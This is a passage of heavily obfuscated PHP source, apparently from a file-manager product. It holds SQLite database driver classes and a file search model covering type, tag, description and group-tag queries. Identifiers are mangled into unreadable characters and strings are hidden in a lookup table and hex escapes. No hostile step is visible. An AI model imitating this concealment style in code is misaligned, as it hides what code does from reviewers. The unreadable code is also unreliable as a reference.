$Ò…©£Ğ¶[$æ½Õ¹†„[16]] = 438; } $this->config = $Ò…©£Ğ¶; if (empty($this->config[$æ½Õ¹†„[17]])) { $this->config[$æ½Õ¹†„[17]] = array(); } } } public function connect($ÎÏºà¶ë = '', $”ô‘¤ú¢ = 0) { $š»Ú´ß¨ =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->linkID[$”ô‘¤ú¢])) { if (empty($ÎÏºà¶ë)) { $ÎÏºà¶ë = $this->config; } $Î´Ñ€Ù = !empty($ÎÏºà¶ë[$š»Ú´ß¨[17]][$š»Ú´ß¨[18]]) ? $ÎÏºà¶ë[$š»Ú´ß¨[17]][$š»Ú´ß¨[18]] : $this->pconnect; $“ŒÔÇÄÑ = $Î´Ñ€Ù ? $š»Ú´ß¨[19] : $š»Ú´ß¨[20]; $this->linkID[$”ô‘¤ú¢] = $“ŒÔÇÄÑ($ÎÏºà¶ë[$š»Ú´ß¨[21]], $ÎÏºà¶ë[$š»Ú´ß¨[16]]); if (!$this->linkID[$”ô‘¤ú¢]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$”ô‘¤ú¢], 30000); if (1 != think_config($š»Ú´ß¨[22])) { unset($this->config); } } return $this->linkID[$”ô‘¤ú¢]; } public function free() { $this->queryID = null; } public function query($Àä•´â) { $ñİ˜Èó‡ =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Àä•´â; if ($this->queryID) { $this->free(); } think_action_status($ñİ˜Èó‡[23], 1); think_status($ñİ˜Èó‡[24]); $this->queryID = sqlite_query($this->_linkID, $Àä•´â); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $êæéŠÎà = $this->getAll(); return $êæéŠÎà; } } public function execute($œ¨çÁ÷â) { $æ“Óî«õ =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $œ¨çÁ÷â; if ($this->queryID) { $this->free(); } think_action_status($æ“Óî«õ[25], 1); think_status($æ“Óî«õ[24]); $µ–ÃæöÙ = sqlite_exec($this->_linkID, $œ¨çÁ÷â); $this->debug(); if (!1 === $µ–ÃæöÙ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[şÒÁøÒÄ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $í¼Ä¤É„ = sqlite_query($this->_linkID, $_SERVER[şÒÁøÒÄ][27]); if (!$í¼Ä¤É„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓÀ†À’Ø = sqlite_query($this->_linkID, $_SERVER[şÒÁøÒÄ][28]); if (!$ÓÀ†À’Ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ËìÜ€½© = array(); if ($this->numRows > 0) { for ($àñºÎÁÜ = 0; $àñºÎÁÜ < $this->numRows; $àñºÎÁÜ++) { $ËìÜ€½©[$àñºÎÁÜ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ËìÜ€½©; } public function getFields($­„ÊÔ…š) { $Í©·í„ë =& $_SERVER[şÒÁøÒÄ]; $¼‘ú¶Ş¢ = $this->query($Í©·í„ë[29] . $­„ÊÔ…š . $Í©·í„ë[30]); $õ‹¢ŞÅ = array(); if ($¼‘ú¶Ş¢) { foreach ($¼‘ú¶Ş¢ as $¨¯ìŠäÓ => $ì³À¶Ì) { $õ‹¢ŞÅ[$ì³À¶Ì[$Í©·í„ë[31]]] = array($Í©·í„ë[32] => $ì³À¶Ì[$Í©·í„ë[31]], $Í©·í„ë[33] => $ì³À¶Ì[$Í©·í„ë[34]], $Í©·í„ë[35] => (bool) ($ì³À¶Ì[$Í©·í„ë[36]] === $Í©·í„ë[12]), $Í©·í„ë[37] => $ì³À¶Ì[$Í©·í„ë[38]], $Í©·í„ë[39] => strtolower($ì³À¶Ì[$Í©·í„ë[40]]) == $Í©·í„ë[41], $Í©·í„ë[42] => strtolower($ì³À¶Ì[$Í©·í„ë[43]]) == $Í©·í„ë[44]); } } return $õ‹¢ŞÅ; } public function getTables($¬¼àıÉ‡ = '') { $ğ’Òõ¦µ =& $_SERVER[şÒÁøÒÄ]; $‹ÙÀæµ = $this->query($ğ’Òõ¦µ[45] . $ğ’Òõ¦µ[46] . $ğ’Òõ¦µ[47]); $Ôü¨Ï¸ = array(); foreach ($‹ÙÀæµ as $çÇ‰ä¼ => $¨«Õ×€») { $Ôü¨Ï¸[$çÇ‰ä¼] = current($¨«Õ×€»); } return $Ôü¨Ï¸; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ú©şŒ§ =& $_SERVER[şÒÁøÒÄ]; $»´Ãïî¸ = sqlite_last_error($this->_linkID); $this->error = $»´Ãïî¸ . $ú©şŒ§[4] . sqlite_error_string($»´Ãïî¸); if ($ú©şŒ§[12] != $this->queryStr) { $this->error .= LNG($ú©şŒ§[48]) . $this->queryStr; } think_trace($this->error, $ú©şŒ§[12], $ú©şŒ§[49]); return $this->error; } public function escapeString($ùˆĞº”) { return sqlite_escape_string($ùˆĞº”); } public function parseLimit($Š¾Â¸…) { $×£íƒÚ =& $_SERVER[şÒÁøÒÄ]; $Ñ¨ºÕÆ£ = $×£íƒÚ[12]; if (!empty($Š¾Â¸…)) { $Š¾Â¸… = explode($×£íƒÚ[50], $Š¾Â¸…); if (count($Š¾Â¸…) > 1) { $Ñ¨ºÕÆ£ .= $×£íƒÚ[51] . $Š¾Â¸…[1] . $×£íƒÚ[52] . $Š¾Â¸…[0] . $×£íƒÚ[53]; } else { $Ñ¨ºÕÆ£ .= $×£íƒÚ[51] . $Š¾Â¸…[0] . $×£íƒÚ[53]; } } return $Ñ¨ºÕÆ£; } } class DbSqlite3Base extends Db { public function __construct($¡©íŸÒ‰ = '') { $¥‰¯ìÜô =& $_SERVER[şÒÁøÒÄ]; if (!class_exists($¥‰¯ìÜô[54])) { think_exception(think_lang($¥‰¯ìÜô[14]) . $¥‰¯ìÜô[55]); } if (!empty($¡©íŸÒ‰)) { if (!isset($¡©íŸÒ‰[$¥‰¯ìÜô[16]])) { $¡©íŸÒ‰[$¥‰¯ìÜô[16]] = 438; } $this->config = $¡©íŸÒ‰; if (empty($this->config[$¥‰¯ìÜô[17]])) { $this->config[$¥‰¯ìÜô[17]] = array(); } } } public function connect($ª†ˆ¿Ÿ÷ = '', $ÍÆ¨ƒª = 0) { $Ê­æÕ—ç =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->linkID[$ÍÆ¨ƒª])) { if (empty($ª†ˆ¿Ÿ÷)) { $ª†ˆ¿Ÿ÷ = $this->config; } $this->linkID[$ÍÆ¨ƒª] = new SQLite3($ª†ˆ¿Ÿ÷[$Ê­æÕ—ç[21]]); if (!$this->linkID[$ÍÆ¨ƒª]) { think_exception($this->linkID[$ÍÆ¨ƒª]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÍÆ¨ƒª]->busyTimeout(30000); if (1 != think_config($Ê­æÕ—ç[22])) { unset($this->config); } } return $this->linkID[$ÍÆ¨ƒª]; } public function free() { $this->queryID = null; } public function query($–Âë¸“Õ) { $êŞ¤˜™ =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $–Âë¸“Õ; if ($this->queryID) { $this->free(); } think_action_status($êŞ¤˜™[23], 1); think_status($êŞ¤˜™[24]); $this->queryID = $this->_linkID->query($–Âë¸“Õ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ıøØ€ã¶ = $this->getAll(); $this->numRows = count($ıøØ€ã¶); return $ıøØ€ã¶; } } public function execute($³÷êÇıî) { $‚°ØÇ‚ä =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $³÷êÇıî; if ($this->queryID) { $this->free(); } think_action_status($‚°ØÇ‚ä[25], 1); think_status($‚°ØÇ‚ä[24]); $¸¸É¹¤Ö = $this->_linkID->exec($³÷êÇıî); $this->debug(); if (!1 === $¸¸É¹¤Ö) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[şÒÁøÒÄ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şõÈ÷û° = $this->_linkID->query($_SERVER[şÒÁøÒÄ][27]); if (!$şõÈ÷û°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ì’¸Ê©Û = $this->_linkID->query($_SERVER[şÒÁøÒÄ][28]); if (!$ì’¸Ê©Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $µ³£§ü­ = array(); while ($ñö·„‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $µ³£§ü­[] = $ñö·„‰; } $this->queryID->reset(); return $µ³£§ü­; } public function getFields($¿–Œå­) { $­ Íßğ =& $_SERVER[şÒÁøÒÄ]; $ °ÚÛ = $this->query($­ Íßğ[29] . $¿–Œå­ . $­ Íßğ[30]); $ãøÂ£Ó“ = array(); if ($ °ÚÛ) { foreach ($ °ÚÛ as $ØüÙ³× => $¡ùé¤º) { $ãøÂ£Ó“[$¡ùé¤º[$­ Íßğ[32]]] = array($­ Íßğ[32] => $¡ùé¤º[$­ Íßğ[32]], $­ Íßğ[33] => $¡ùé¤º[$­ Íßğ[33]], $­ Íßğ[35] => (bool) ($¡ùé¤º[$­ Íßğ[35]] === $­ Íßğ[12]), $­ Íßğ[37] => $¡ùé¤º[$­ Íßğ[56]], $­ Íßğ[39] => (bool) $¡ùé¤º[$­ Íßğ[57]], $­ Íßğ[42] => (bool) $¡ùé¤º[$­ Íßğ[57]]); } } return $ãøÂ£Ó“; } public function getTables($ƒ¡ÉÓÑ– = '') { $¼•şéÙ =& $_SERVER[şÒÁøÒÄ]; $ı°äÌî = $this->query($¼•şéÙ[45] . $¼•şéÙ[46] . $¼•şéÙ[47]); $Ëå‡üâ = array(); foreach ($ı°äÌî as $õœ›øœ¸ => $µÙÄ„ÂÛ) { $Ëå‡üâ[$õœ›øœ¸] = current($µÙÄ„ÂÛ); } return $Ëå‡üâ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $½„‹×Ûè =& $_SERVER[şÒÁøÒÄ]; $this->error = $this->_linkID->lastErrorMsg(); if ($½„‹×Ûè[12] != $this->queryStr) { $this->error .= LNG($½„‹×Ûè[48]) . $this->queryStr; } think_trace($this->error, $½„‹×Ûè[12], $½„‹×Ûè[49]); return $this->error; } public function escapeString($Ä¾øéÀó) { $ãí‡Ğ´¤ =& $_SERVER[şÒÁøÒÄ]; if ($this->_linkID) { return $this->_linkID->escapeString($Ä¾øéÀó); } return str_ireplace($ãí‡Ğ´¤[58], $ãí‡Ğ´¤[59], $Ä¾øéÀó); } public function parseLimit($‹¦º‚“ô) { $¤·Ñ€Ï =& $_SERVER[şÒÁøÒÄ]; $Ø¤óà = $¤·Ñ€Ï[12]; if (!empty($‹¦º‚“ô)) { $‹¦º‚“ô = explode($¤·Ñ€Ï[50], $‹¦º‚“ô); if (count($‹¦º‚“ô) > 1) { $Ø¤óà .= $¤·Ñ€Ï[51] . $‹¦º‚“ô[1] . $¤·Ñ€Ï[52] . $‹¦º‚“ô[0] . $¤·Ñ€Ï[53]; } else { $Ø¤óà .= $¤·Ñ€Ï[51] . $‹¦º‚“ô[0] . $¤·Ñ€Ï[53]; } } return $Ø¤óà; } } goto b†áœ‡ªÙ›; bà®®Êæ‹–: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÌÄî†·†) { $¤ÀÕ‹ÚÈ =& $_SERVER[şÒÁøÒÄ]; $ø¶¡Èº… = KodIO::fileTypeList(); $Üãó®’® = $ø¶¡Èº…[$ÌÄî†·†]; if (!$Üãó®’®) { return array(); } $½Š½Úêó = $Üãó®’®[$¤ÀÕ‹ÚÈ[174]]; $İãéïû› = $¤ÀÕ‹ÚÈ[7]; if (!$Üãó®’®[$¤ÀÕ‹ÚÈ[174]]) { $€Î³ˆÑõ = array_to_keyvalue($ø¶¡Èº…, $¤ÀÕ‹ÚÈ[12], $¤ÀÕ‹ÚÈ[174]); $½Š½Úêó = implode($¤ÀÕ‹ÚÈ[50], $€Î³ˆÑõ); $İãéïû› = $¤ÀÕ‹ÚÈ[2124]; } $ì¿ÊØ»î = explode($¤ÀÕ‹ÚÈ[50], trim($½Š½Úêó, $¤ÀÕ‹ÚÈ[50])); return array($İãéïû›, $ì¿ÊØ»î); } public function listPathType($Õİ“ì¸ ) { $ÌÊ¨ˆÖõ =& $_SERVER[şÒÁøÒÄ]; $ºî¿ÀŸ¦ = $this->fileTypeWhere($Õİ“ì¸ ); if (!$ºî¿ÀŸ¦) { return array(); } $–°§ùÊ« = USER_ID; $×©ÏØ¥ = Model($ÌÊ¨ˆÖõ[525])->getInfo($–°§ùÊ«); $Û÷ûÈ¬¾ = array($ÌÊ¨ˆÖõ[576] => SourceModel::TYPE_USER, $ÌÊ¨ˆÖõ[511] => array($ÌÊ¨ˆÖõ[540], $ÌÊ¨ˆÖõ[521] . $×©ÏØ¥[$ÌÊ¨ˆÖõ[87]][$ÌÊ¨ˆÖõ[402]] . $ÌÊ¨ˆÖõ[541]), $ÌÊ¨ˆÖõ[577] => $–°§ùÊ«, $ÌÊ¨ˆÖõ[574] => 0, $ÌÊ¨ˆÖõ[575] => $ºî¿ÀŸ¦); return $this->listSource($Û÷ûÈ¬¾); } public function listSearch($ŠÊ™Áî, $æ¨—û³ = 300) { $äÄ¨…Ôš =& $_SERVER[şÒÁøÒÄ]; if (isset($ŠÊ™Áî[$äÄ¨…Ôš[1963]]) && $ŠÊ™Áî[$äÄ¨…Ôš[1963]]) { $ŠÊ™Áî[$äÄ¨…Ôš[1963]] = str_replace($äÄ¨…Ôš[384], $äÄ¨…Ôš[2125], trim($ŠÊ™Áî[$äÄ¨…Ôš[1963]])); } $Æ—é‰ö = $this->_parseSearchWhere($ŠÊ™Áî); if (!isset($Æ—é‰ö[$äÄ¨…Ôš[431]])) { $Æ—é‰ö[$äÄ¨…Ôš[431]] = 0; } $¨–²×Ÿ… = $äÄ¨…Ôš[2126]; $ÏÉòŞ­ã = $Æ—é‰ö; $ÏŸ®Şñæ = $¨–²×Ÿ…; $this->_listSearchBindPinyin($ŠÊ™Áî, $Æ—é‰ö, $¨–²×Ÿ…); $this->alias($äÄ¨…Ôš[446])->_makeOrder(); $Æ—é‰ö = $this->parseWhereLike($Æ—é‰ö); $ğ«â¡Â• = $this->distinct(!0)->field($¨–²×Ÿ…)->where($Æ—é‰ö)->selectPage($æ¨—û³); if ($GLOBALS[$äÄ¨…Ôš[6]][$äÄ¨…Ôš[381]][$äÄ¨…Ôš[382]] && Input::check($ŠÊ™Áî[$äÄ¨…Ôš[1963]], $äÄ¨…Ôš[583]) && $ğ«â¡Â•[$äÄ¨…Ôš[366]][$äÄ¨…Ôš[353]] == 1 && $ğ«â¡Â•[$äÄ¨…Ôš[366]][$äÄ¨…Ôš[367]] == 0) { $ğ«â¡Â• = $this->distinct(!0)->field($¨–²×Ÿ…)->where($ÏÉòŞ­ã)->limit(1000)->select(); $ğ«â¡Â• = array_page_split($ğ«â¡Â•, !1, $æ¨—û³); } $this->_listSearchFileContent($ğ«â¡Â•, $ŠÊ™Áî, $ÏŸ®Şñæ, $ÏÉòŞ­ã); $this->_listSearchDesc($ğ«â¡Â•, $ŠÊ™Áî, $ÏŸ®Şñæ); $this->_listSearchTag($ğ«â¡Â•, $ŠÊ™Áî, $ÏŸ®Şñæ); $this->_listSearchGroupTag($ğ«â¡Â•, $ŠÊ™Áî, $ÏŸ®Şñæ); $this->_listDataApply($ğ«â¡Â•[$äÄ¨…Ôš[369]]); $this->_listMake($ğ«â¡Â•); return $ğ«â¡Â•; } private function _listSearchFileContent(&$‹ÚøÄ¯ , $×ï×ƒóÇ, $Ô¡ßÍì‰, $œ‘ôºÅ) { $„ƒÁéú =& $_SERVER[şÒÁøÒÄ]; if (!$×ï×ƒóÇ[$„ƒÁéú[1963]] || $‹ÚøÄ¯ [$„ƒÁéú[366]][$„ƒÁéú[353]] > 1) { return; } if (!isset($œ‘ôºÅ[$„ƒÁéú[32]]) || !is_array($×ï×ƒóÇ[$„ƒÁéú[468]])) { return; } $œ‘ôºÅ[$„ƒÁéú[468]] = array($„ƒÁéú[7], $×ï×ƒóÇ[$„ƒÁéú[468]]); unset($œ‘ôºÅ[$„ƒÁéú[32]]); unset($×ï×ƒóÇ[$„ƒÁéú[468]]); $ùÅà¡ºÏ = $this->field($Ô¡ßÍì‰)->where($œ‘ôºÅ)->limit($„ƒÁéú[2127])->select(); if (!$ùÅà¡ºÏ || count($ùÅà¡ºÏ) == 0) { return; } $‹ÚøÄ¯ [$„ƒÁéú[369]] = array_merge($ùÅà¡ºÏ, $‹ÚøÄ¯ [$„ƒÁéú[369]]); $‹ÚøÄ¯ [$„ƒÁéú[366]][$„ƒÁéú[367]] += count($ùÅà¡ºÏ); } private function _listSearchTag(&$ø‹öØÓ¤, $äÄ‰×ô, $’ş¢ê¨÷) { $‹ÂİÛì• =& $_SERVER[şÒÁøÒÄ]; if (!$äÄ‰×ô[$‹ÂİÛì•[1963]] || $ø‹öØÓ¤[$‹ÂİÛì•[366]][$‹ÂİÛì•[353]] > 1) { return; } $ê¼¡šºÀ = Model($‹ÂİÛì•[2128])->listData(); $ÁäÊÜ = array(); $ô”‰é« = $äÄ‰×ô[$‹ÂİÛì•[1963]]; foreach ($ê¼¡šºÀ as $Ì´®å´µ) { $ØÄ‰Öª÷ = $Ì´®å´µ[$‹ÂİÛì•[32]]; $Ã·ĞĞª = str_replace($‹ÂİÛì•[53], $‹ÂİÛì•[12], Pinyin::get($ØÄ‰Öª÷)); if (stripos($ØÄ‰Öª÷, $ô”‰é«) !== !1 || stripos($Ã·ĞĞª, $ô”‰é«) !== !1) { $ÁäÊÜ[] = $Ì´®å´µ[$‹ÂİÛì•[399]]; } } if (!$ÁäÊÜ) { return; } $ï¯³†÷» = array($‹ÂİÛì•[426] => array($‹ÂİÛì•[7], $ÁäÊÜ), $‹ÂİÛì•[1680] => USER_ID); $ùª¶íºõ = Model($‹ÂİÛì•[428])->field($‹ÂİÛì•[84])->where($ï¯³†÷»)->select(); $ùª¶íºõ = array_to_keyvalue($ùª¶íºõ, $‹ÂİÛì•[12], $‹ÂİÛì•[84]); $¿‘·Ÿ©¡ = array_unique($ùª¶íºõ); $this->_listSearchMerge($ø‹öØÓ¤, $äÄ‰×ô, $’ş¢ê¨÷, $¿‘·Ÿ©¡); } private function _listSearchDesc(&$öıöşÃ, $ò¢±”û, $Ãşü¨ÑÕ) { $¢èÆû°— =& $_SERVER[şÒÁøÒÄ]; if (!$ò¢±”û[$¢èÆû°—[1963]] || $öıöşÃ[$¢èÆû°—[366]][$¢èÆû°—[353]] > 1) { return; } $’¤…òúù = array($¢èÆû°—[94] => $¢èÆû°—[453], $¢èÆû°—[374] => array($¢èÆû°—[383], $¢èÆû°—[1965] . $ò¢±”û[$¢èÆû°—[1963]] . $¢èÆû°—[1965])); $ø‡ªœÙ = !1; if ($ø‡ªœÙ) { $èÉ‹›šÒ = $this->listSearchChildren($ò¢±”û[$¢èÆû°—[432]]); $èÉ‹›šÒ = array_unique($èÉ‹›šÒ); if (!$èÉ‹›šÒ) { return; } $’¤…òúù[$¢èÆû°—[402]] = array($¢èÆû°—[7], $èÉ‹›šÒ); } $ÑãÈõÅĞ = Model($¢èÆû°—[560])->field($¢èÆû°—[402])->where($’¤…òúù)->limit(5000)->select(); $§ÒåÜ÷À = array_to_keyvalue($ÑãÈõÅĞ, $¢èÆû°—[12], $¢èÆû°—[402]); $this->_listSearchMerge($öıöşÃ, $ò¢±”û, $Ãşü¨ÑÕ, $§ÒåÜ÷À); } private function _listSearchGroupTag(&$áô¹·Õ, $ÆÉÅ¨ß, $õ›Î¦ƒ) { $¾¾ççÍı =& $_SERVER[şÒÁøÒÄ]; if (!$ÆÉÅ¨ß[$¾¾ççÍı[1963]] || $áô¹·Õ[$¾¾ççÍı[366]][$¾¾ççÍı[353]] > 1 || !$ÆÉÅ¨ß[$¾¾ççÍı[432]]) { return; } $µ•šÉı¼ = $this->sourceInfo($ÆÉÅ¨ß[$¾¾ççÍı[432]]); if (!$µ•šÉı¼ || $µ•šÉı¼[$¾¾ççÍı[411]] != SourceModel::TYPE_GROUP) { return; } $Ä’ÍÉ± = $µ•šÉı¼[$¾¾ççÍı[496]]; $§†İ×À = Model($¾¾ççÍı[2129])->get($Ä’ÍÉ±); $›£´¦öÔ = array(); $ÁèÆÖ¸ = $ÆÉÅ¨ß[$¾¾ççÍı[1963]]; foreach ($§†İ×À[$¾¾ççÍı[369]] as $¥‰ü—ä) { $à‘È˜ó¥ = $¥‰ü—ä[$¾¾ççÍı[32]]; $ÂÒİº¦û = str_replace($¾¾ççÍı[53], $¾¾ççÍı[12], Pinyin::get($à‘È˜ó¥)); if (stripos($à‘È˜ó¥, $ÁèÆÖ¸) !== !1 || stripos($ÂÒİº¦û, $ÁèÆÖ¸) !== !1) { $›£´¦öÔ[] = $¥‰ü—ä[$¾¾ççÍı[399]]; } } if (!$›£´¦öÔ) { return; } $ šø³•• = array($¾¾ççÍı[426] => array($¾¾ççÍı[7], $›£´¦öÔ), $¾¾ççÍı[1680] => 0, $¾¾ççÍı[33] => $¾¾ççÍı[1985] . $Ä’ÍÉ±); $õåùı“° = Model($¾¾ççÍı[428])->field($¾¾ççÍı[84])->where($ šø³••)->select(); $õåùı“° = array_to_keyvalue($õåùı“°, $¾¾ççÍı[12], $¾¾ççÍı[84]); $î¼Ë†²‰ = array_unique($õåùı“°); $this->_listSearchMerge($áô¹·Õ, $ÆÉÅ¨ß, $õ›Î¦ƒ, $î¼Ë†²‰); } private function _listSearchMerge(&$Ê‡ÊÍâÇ, $ì…¾‘úğ, $¨ŸûüìÜ, $ùÛÂ°ÛÔ) { $È©¤èäô =& $_SERVER[şÒÁøÒÄ]; if (!$ùÛÂ°ÛÔ) { return; } $ğ×¿—ìè = array_to_keyvalue($Ê‡ÊÍâÇ[$È©¤èäô[369]], $È©¤èäô[12], $È©¤èäô[402]); $¾”»Ç¥ = array_diff($ùÛÂ°ÛÔ, $ğ×¿—ìè); if (!$¾”»Ç¥) { return; } $ô³°“â› = array($È©¤èäô[402] => array($È©¤èäô[7], $¾”»Ç¥)); $†¥¸È¨Ó = $this->field($¨ŸûüìÜ)->where($ô³°“â›)->select(); if (!$†¥¸È¨Ó) { return; } $ïÃ‡™ = array(); foreach ($†¥¸È¨Ó as $ÖÈÜ»œ½) { if ($this->_listSearchFilter($ÖÈÜ»œ½, $ì…¾‘úğ)) { $ïÃ‡™[] = $ÖÈÜ»œ½; } } $Ê‡ÊÍâÇ[$È©¤èäô[369]] = array_merge($ïÃ‡™, $Ê‡ÊÍâÇ[$È©¤èäô[369]]); $Ê‡ÊÍâÇ[$È©¤èäô[366]][$È©¤èäô[367]] += count($ïÃ‡™); } private function _listSearchFilter($˜²¹–Šã, $ôºßÀ‹ˆ) { $¡·ªÁ§Â =& $_SERVER[şÒÁøÒÄ]; $š·û—’ß = $˜²¹–Šã[$¡·ªÁ§Â[410]] == $¡·ªÁ§Â[88]; if (!strstr($˜²¹–Šã[$¡·ªÁ§Â[511]], $¡·ªÁ§Â[50] . $ôºßÀ‹ˆ[$¡·ªÁ§Â[432]] . $¡·ªÁ§Â[50])) { return !1; } if (isset($ôºßÀ‹ˆ[$¡·ªÁ§Â[412]]) && $ôºßÀ‹ˆ[$¡·ªÁ§Â[412]] != $¡·ªÁ§Â[1924]) { if ($ôºßÀ‹ˆ[$¡·ªÁ§Â[412]] == $¡·ªÁ§Â[75] && !$š·û—’ß) { return !1; } if ($ôºßÀ‹ˆ[$¡·ªÁ§Â[412]] != $¡·ªÁ§Â[75] && $š·û—’ß) { return !1; } if (!strstr($˜²¹–Šã[$¡·ªÁ§Â[174]], $¡·ªÁ§Â[50] . $ôºßÀ‹ˆ[$¡·ªÁ§Â[412]] . $¡·ªÁ§Â[50])) { return !1; } } if (isset($ôºßÀ‹ˆ[$¡·ªÁ§Â[2130]]) && $ôºßÀ‹ˆ[$¡·ªÁ§Â[2130]] < $˜²¹–Šã[$¡·ªÁ§Â[76]]) { return !1; } if (isset($ôºßÀ‹ˆ[$¡·ªÁ§Â[2131]]) && $ôºßÀ‹ˆ[$¡·ªÁ§Â[2131]] > $˜²¹–Šã[$¡·ªÁ§Â[76]]) { return !1; } if (isset($ôºßÀ‹ˆ[$¡·ªÁ§Â[590]]) && $ôºßÀ‹ˆ[$¡·ªÁ§Â[590]] != $˜²¹–Šã[$¡·ªÁ§Â[456]]) { return !1; } return !0; } public function listSearchChildren($ûÁÄø”ê, $—•ÓÒ¼© = 5000) { $äÀÖŞÕ· =& $_SERVER[şÒÁøÒÄ]; $ü¡íÅ«· = array(); $¯‰ŞÌ’Œ = $this->sourceInfo($ûÁÄø”ê); $Ô½È…ğø = array($äÀÖŞÕ·[511] => array($äÀÖŞÕ·[383], $¯‰ŞÌ’Œ[$äÀÖŞÕ·[511]] . $¯‰ŞÌ’Œ[$äÀÖŞÕ·[402]] . $äÀÖŞÕ·[541])); $ìî§ñı¸ = $this->field($äÀÖŞÕ·[76])->where($Ô½È…ğø)->limit($—•ÓÒ¼© + 1)->select(); $Æ¢¥÷¤ = is_array($ìî§ñı¸) ? count($ìî§ñı¸) : 0; if ($Æ¢¥÷¤ > $—•ÓÒ¼©) { return $this->_listSearchChildrenNear($ûÁÄø”ê, $—•ÓÒ¼©); } $¿Éô¬²Ê = $this->field($äÀÖŞÕ·[402])->where($Ô½È…ğø)->select(); $ü¡íÅ«· = array_to_keyvalue($¿Éô¬²Ê, $äÀÖŞÕ·[12], $äÀÖŞÕ·[402]); return $ü¡íÅ«·; } private function _listSearchChildrenNear($àø÷ ¿Ü, $„¯¬Å) { $¶¥â¸±í =& $_SERVER[şÒÁøÒÄ]; $¿û•³ù = array(); $’ñíè¸Æ = array($¶¥â¸±í[432] => $àø÷ ¿Ü); $«ëÄÏ­æ = $this->field($¶¥â¸±í[2132])->where($’ñíè¸Æ)->select(); $¢¬«ËÆ = array_to_keyvalue(array_filter_by_field($«ëÄÏ­æ, $¶¥â¸±í[410], $¶¥â¸±í[88]), $¶¥â¸±í[12], $¶¥â¸±í[402]); $¿û•³ù = array_merge($¿û•³ù, array_to_keyvalue($«ëÄÏ­æ, $¶¥â¸±í[12], $¶¥â¸±í[402])); if (!$¢¬«ËÆ) { return $¿û•³ù; } $’ñíè¸Æ = array($¶¥â¸±í[432] => array($¶¥â¸±í[7], $¢¬«ËÆ)); $«ëÄÏ­æ = $this->field($¶¥â¸±í[2132])->where($’ñíè¸Æ)->limit($„¯¬Å)->select(); $¿û•³ù = array_merge($¿û•³ù, array_to_keyvalue($«ëÄÏ­æ, $¶¥â¸±í[12], $¶¥â¸±í[402])); $¿û•³ù = array_slice($¿û•³ù, 0, $„¯¬Å); return $¿û•³ù; } private function _listSearchBindPinyin($»ÜÁŒÂä, &$Ï¾¡äØÓ, &$’—æ†‡Ä) { $¨Û´º¤ƒ =& $_SERVER[şÒÁøÒÄ]; if (!isset($»ÜÁŒÂä[$¨Û´º¤ƒ[1963]]) || !$»ÜÁŒÂä[$¨Û´º¤ƒ[1963]]) { return; } if (!Input::check($»ÜÁŒÂä[$¨Û´º¤ƒ[1963]], $¨Û´º¤ƒ[318]) || strlen($»ÜÁŒÂä[$¨Û´º¤ƒ[1963]]) < 2) { return; } $Û—ïãé‘ = "\x4c\105\x46\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\137\163\157\x75\x72\143\145\137\x6d\x65\164\x61\x20\x6d\x65\x74\141\x20\157\x6e\40\163\x6f\x75\x72\143\145\x2e\163\157\x75\162\x63\x65\111\104\40\75\40\155\x65\x74\141\x2e\163\157\165\162\143\145\111\x44"; $×“ü™ÒÜ = array(); $’—æ†‡Ä = str_replace(array($¨Û´º¤ƒ[231], $¨Û´º¤ƒ[53], $¨Û´º¤ƒ[2133]), $¨Û´º¤ƒ[12], $’—æ†‡Ä); $’—æ†‡Ä = $¨Û´º¤ƒ[438] . str_replace($¨Û´º¤ƒ[50], $¨Û´º¤ƒ[439], $’—æ†‡Ä); $êùâ¬Èä = $Ï¾¡äØÓ[$¨Û´º¤ƒ[32]]; unset($Ï¾¡äØÓ[$¨Û´º¤ƒ[32]]); foreach ($Ï¾¡äØÓ as $›ìÍ‰çÃ => $­ëƒ²¾û) { $×“ü™ÒÜ[$¨Û´º¤ƒ[438] . $›ìÍ‰çÃ] = $­ëƒ²¾û; } foreach ($êùâ¬Èä as $Ç©˜–›É) { $×“ü™ÒÜ[] = array($¨Û´º¤ƒ[443] => $Ç©˜–›É, $¨Û´º¤ƒ[1013] => $¨Û´º¤ƒ[1967], array($¨Û´º¤ƒ[2134] => $Ç©˜–›É, $¨Û´º¤ƒ[2135] => array($¨Û´º¤ƒ[7], array($¨Û´º¤ƒ[465], $¨Û´º¤ƒ[464])))); } 